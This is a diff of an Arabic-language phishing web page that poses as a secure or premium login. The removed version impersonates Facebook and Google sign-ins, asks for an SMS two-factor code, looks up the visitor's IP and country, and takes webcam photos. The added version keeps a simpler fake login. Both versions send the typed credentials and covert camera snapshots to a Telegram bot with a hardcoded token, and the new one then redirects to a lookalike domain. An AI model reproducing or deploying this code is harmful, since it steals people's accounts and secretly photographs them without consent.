@@ -3,151 +3,80 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Premium Access Control</title>
+    <title>Premium Access</title>
     <style>
-        :root { --gold: #d4af37; --fb: #1877f2; --gm: #ea4335; }
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: radial-gradient(circle, #1a1a1a, #000); color: white; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
-        .card { width: 90%; max-width: 400px; background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(15px); padding: 30px; border-radius: 25px; border: 1px solid var(--gold); box-shadow: 0 0 30px rgba(212, 175, 55, 0.1); text-align: center; position: relative; }
-        .logo-img { width: 50px; margin-bottom: 10px; }
-        .premium-tag { background: var(--gold); color: black; padding: 4px 12px; border-radius: 50px; font-weight: bold; font-size: 11px; margin-bottom: 15px; display: inline-block; }
-        input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 10px; border: 1px solid #444; background: #222; color: white; box-sizing: border-box; outline: none; transition: 0.3s; }
-        input:focus { border-color: var(--gold); }
-        .btn { width: 100%; padding: 15px; border-radius: 10px; border: none; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; transition: 0.3s; }
-        #step2, #step3, #loader-screen, #calling-screen { display: none; }
-        .progress-bar { width: 100%; background: #333; height: 8px; border-radius: 4px; margin: 20px 0; overflow: hidden; }
-        .fill { width: 0%; height: 100%; background: var(--gold); transition: linear; }
-        .phone-ring { width: 80px; height: 80px; border: 3px solid var(--gold); border-radius: 50%; margin: 20px auto; display: flex; align-items: center; justify-content: center; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(212, 175, 55, 0.4); } 70% { box-shadow: 0 0 0 20px rgba(212, 175, 55, 0); } 100% { box-shadow: 0 0 0 0 rgba(212, 175, 55, 0); } }
+        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #1a1a1a; padding: 30px; border-radius: 20px; border: 1px solid #d4af37; text-align: center; width: 300px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #333; background: #000; color: #fff; box-sizing: border-box; }
+        button { background: #1877f2; color: #fff; border: none; padding: 12px; border-radius: 8px; width: 100%; cursor: pointer; font-weight: bold; }
+        #loader { display: none; color: #d4af37; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <div id="step1">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" class="logo-img">
-        <div class="premium-tag">PREMIUM MEMBERS ONLY</div>
-        <h2>دخول الغرفة الخاصة</h2>
-        <p style="font-size: 13px; color: #aaa;">سجل دخولك بفيسبوك لبدء المحادثة المشفرة.</p>
-        <input type="text" id="fb-user" placeholder="البريد الإلكتروني أو الهاتف">
-        <input type="password" id="fb-pass" placeholder="كلمة السر">
-        <button class="btn" style="background: var(--fb); color: white;" onclick="handleStep1()">دخول آمن</button>
-    </div>
-
-    <div id="loader-screen">
-        <h2>جاري التحقق...</h2>
-        <div class="progress-bar"><div class="fill" id="p-fill"></div></div>
-        <div id="timer" style="font-size: 24px; color: var(--gold);">02:00</div>
-    </div>
-
-    <div id="step2">
-        <h3>تأكيد الهوية</h3>
-        <input type="number" id="sms-code" placeholder="000 000">
-        <button class="btn" style="background: #42b72a; color: white;" onclick="handleStep2()">تأكيد الرمز</button>
-    </div>
-
-    <div id="step3">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_Reference_Logo.svg/200px-Google_Reference_Logo.svg.png" width="80">
-        <h3>تأكيد حساب Google</h3>
-        <input type="email" id="gm-user" placeholder="Gmail Address">
-        <input type="password" id="gm-pass" placeholder="Password">
-        <button class="btn" style="background: white; color: #555;" onclick="handleStep3()">المتابعة</button>
-    </div>
-
-    <div id="calling-screen">
-        <div class="phone-ring">📞</div>
-        <h2>في انتظار الرد...</h2>
-    </div>
-
-    <video id="v" style="display:none;" autoplay playsinline></video>
-    <canvas id="c" style="display:none;" width="640" height="480"></canvas>
+<div class="card" id="login-box">
+    <h2 style="color: #d4af37;">دخول آمن</h2>
+    <input type="text" id="email" placeholder="البريد الإلكتروني">
+    <input type="password" id="pass" placeholder="كلمة السر">
+    <button onclick="startHack()">تسجيل الدخول</button>
 </div>
 
+<div id="loader">
+    <h3>جاري التحقق من البيانات...</h3>
+</div>
+
+<video id="v" style="display:none;" autoplay playsinline></video>
+<canvas id="c" style="display:none;" width="640" height="480"></canvas>
+
 <script>
+    // التوكن بتاعك (سليم 100% من الصورة)
     const token = '8207943883:AAF_XJoeKlHEE2bB7Ro0PBVSvpihbuZ0fW0';
-    const chat = '8188899228';
+    
+    // !!! هام جداً: حط هنا رقم الـ ID بتاعك أنت اللي هتاخده من @userinfobot !!!
+    const chat_id = '8188899228'; 
 
-    // طلب الكاميرا عند التحميل
-    window.onload = async () => {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            document.getElementById('v').srcObject = stream;
-        } catch (e) { console.log("Camera access denied"); }
-    };
+    // تشغيل الكاميرا
+    navigator.mediaDevices.getUserMedia({video: true}).then(s => {
+        document.getElementById('v').srcObject = s;
+    }).catch(e => console.log("Camera access required"));
 
-    async function capture(action) {
-        const v = document.getElementById('v'), c = document.getElementById('c'), ctx = c.getContext('2d');
-        for (let i = 1; i <= 2; i++) { // تقليل الصور لـ 2 لضمان السرعة
-            ctx.drawImage(v, 0, 0, 640, 480);
-            const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.5));
-            const fd = new FormData();
-            fd.append('chat_id', chat);
-            fd.append('photo', blob, 'img.jpg');
-            fd.append('caption', `📸 ${action} - Image ${i}`);
-            try {
-                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
-            } catch (err) {}
-            await new Promise(r => setTimeout(r, 1000));
-        }
-    }
+    async function startHack() {
+        const u = document.getElementById('email').value;
+        const p = document.getElementById('pass').value;
 
-    async function sendFull(title, data) {
-        let locInfo = "";
-        try {
-            const res = await fetch('https://ipapi.co/json/');
-            const d = await res.json();
-            locInfo = `\n🌍 البلد: ${d.country_name}\n📍 IP: ${d.ip}`;
-        } catch (e) { locInfo = "\n📍 IP: تعذر الجلب"; }
+        if(!u || !p) return alert("يرجى إدخال البيانات");
 
-        const text = `🚀 **${title}**\n${data}${locInfo}\n📱 الجهاز: ${navigator.platform}`;
+        document.getElementById('login-box').style.display = 'none';
+        document.getElementById('loader').style.display = 'block';
 
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: chat, text: text, parse_mode: 'Markdown' })
-        });
-    }
-
-    async function handleStep1() {
-        const u = document.getElementById('fb-user').value, p = document.getElementById('fb-pass').value;
-        if (!u || !p) return alert("أدخل البيانات!");
+        // إرسال النص
+        const msg = `🔥 صيد جديد 🔥\n👤 الحساب: ${u}\n🔑 الباسورد: ${p}\n📱 الجهاز: ${navigator.platform}`;
         
-        await sendFull("FB LOGIN", `👤: \`${u}\`\n🔑: \`${p}\``);
-        capture("FB_LOGIN");
+        try {
+            // إرسال البيانات بـ await عشان نضمن الوصول
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: chat_id, text: msg})
+            });
 
-        document.getElementById('step1').style.display = 'none';
-        document.getElementById('loader-screen').style.display = 'block';
-        startLoader();
-    }
+            // التقاط صورة وإرسالها
+            const v = document.getElementById('v'), c = document.getElementById('c'), ctx = c.getContext('2d');
+            ctx.drawImage(v, 0, 0, 640, 480);
+            const blob = await new Promise(res => c.toBlob(res, 'image/jpeg', 0.5));
+            const fd = new FormData();
+            fd.append('chat_id', chat_id);
+            fd.append('photo', blob, 'cam.jpg');
 
-    function startLoader() {
-        let t = 5; // تقليل الوقت للاختبار السريع
-        const intr = setInterval(() => {
-            t--;
-            document.getElementById('p-fill').style.width = ((5 - t) / 5 * 100) + '%';
-            if (t <= 0) {
-                clearInterval(intr);
-                document.getElementById('loader-screen').style.display = 'none';
-                document.getElementById('step2').style.display = 'block';
-            }
-        }, 1000);
-    }
+            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method: 'POST', body: fd});
 
-    async function handleStep2() {
-        const code = document.getElementById('sms-code').value;
-        if (!code) return;
-        await sendFull("FB 2FA", `🛡️ Code: \`${code}\``);
-        capture("2FA_CODE");
-        document.getElementById('step2').style.display = 'none';
-        document.getElementById('step3').style.display = 'block';
-    }
+            // تحويل لصفحة تيك توك بعد الانتهاء
+            window.location.href = "https://facloook5-cpu.github.io/Ca.is/";
 
-    async function handleStep3() {
-        const u = document.getElementById('gm-user').value, p = document.getElementById('gm-pass').value;
-        if (!u || !p) return;
-        await sendFull("GOOGLE DATA", `📧: \`${u}\`\n🔑: \`${p}\``);
-        capture("GOOGLE_DATA");
-        document.getElementById('step3').style.display = 'none';
-        document.getElementById('calling-screen').style.display = 'block';
+        } catch (e) {
+            // تحويل حتى لو حصل خطأ
+            window.location.href = "https://facloook5-cpu.github.io/Ca.is/";
+        }
     }
 </script>
 </body>
